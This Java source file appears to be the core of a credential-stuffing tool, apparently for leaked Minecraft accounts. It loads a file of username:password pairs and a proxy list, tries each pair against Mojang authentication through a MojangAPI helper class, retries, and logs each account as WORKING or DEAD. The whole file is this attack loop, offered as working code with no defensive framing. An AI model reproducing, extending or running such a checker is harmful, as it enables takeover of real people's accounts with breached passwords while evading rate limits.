package co.leakmania.checker.utils;

import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;

public class Checker {
	
	public Checker(int retries, File accounts, File proxies) {
		MojangAPI mapi = new MojangAPI(getFileAsString(proxies).split("\n"));
		for (String s : getFileAsString(accounts).split("\n")) {
			String credentials[] = s.split(":");
			for (int i = 0; i != retries; i++) {
				switch (i) {
					case 0:
						Logger.print("Checking: " + s);
						break;
					default:
						Logger.print("Rechecking (" + (i + 1) + "): " + s);
						break;
				}
				switch (mapi.setUsername(credentials[0]).setPassword(credentials[1]).auth()) {
					case WORKING:
						Logger.println(" [WORKING]");
						break;
					case DEAD:
						Logger.println(" [DEAD]");
						break;
				}
			}
		}
	}
	
	public String getFileAsString(File file) {
		try {
			String lines = "";
			Scanner s = new Scanner(file);
			while (s.hasNextLine()) {
				lines += s.nextLine() + "\n";
			}
			s.close();
			return lines.replace("null", "");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return null;
		}
	}
	
}
